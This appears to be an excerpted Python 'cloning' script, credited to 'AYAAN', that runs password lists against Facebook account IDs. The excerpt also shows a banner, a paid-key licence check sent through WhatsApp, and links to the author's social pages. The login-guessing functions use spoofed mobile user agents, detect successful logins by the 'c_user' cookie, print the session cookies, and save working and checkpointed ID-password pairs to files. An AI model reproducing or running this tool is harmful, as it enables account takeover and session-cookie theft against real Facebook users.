...
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mAYAAN

\033[1;32m  •   \033[1;32mFACEBOOK      : \033[1;34m Mahummad Ayaan Tricks

\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35m Mahummad-Ayaan-Tricks
...
a=requests.get("https://github.com/Mahummad-Ayaan-Tricks/AYAAN/blob/main/AYAAN.txt").text
...
if key2 in b:
    ...
    kok = ("Hi ALI RAZA  Sir, I Need To Buy Your Paid AYAAN PRO Tools Version 1.3 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+key1)

    subprocess.check_output(["am", "start", url_wa+(kok)]);time.sleep(2)

    print(' Run :-->              python AYAAN.py')
...
os.system("xdg-open https://www.facebook.com/profile.php?id=100013007954800")
...
def c():
	...
	if ok =='2':
		...
		os.system("xdg-open https://www.facebook.com/profile.php?id=100013007954800");Main()

	if ok =='3':

		print("\033[0;97m USER NAME :\033[0;92m  mahummadayaantricksz ")
...
def R():
    ...
    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/AYAAN-OK.txt\n[•] CP IDS SAVE : /sdcard/AYAAN-CP.txt');input('[•] Press Enter To Back Menu ');Main()
...
def eml():
    ...
    print("[•] FIRST NAME EXAMPLE : khan,baloch...etc \n[•] LAST NAME EXAMPLE : ayaan,zoya...etc");linex()
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                ...
                print("\r \033[0;92m[TRICKS-OK] %s √ %s\033[0;97m         " % (uid, pw))
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m[TRICKS-OK] '+uid+' √ '+ps+'\33[0;97m')

				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))

				

				open('TRICKS-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				...
				print('\33[1;91m[TRICKS-CP] '+uid+' • '+ps+'\33[0;97m')

				open('TRICKS-CP.txt', 'a').write(uid+' • '+ps+'\n')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[TRICKS-OK] %s √ %s'%(ids,pas))
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[TRICKS-CP] '+ids+' • '+pas+'\033[1;97m')
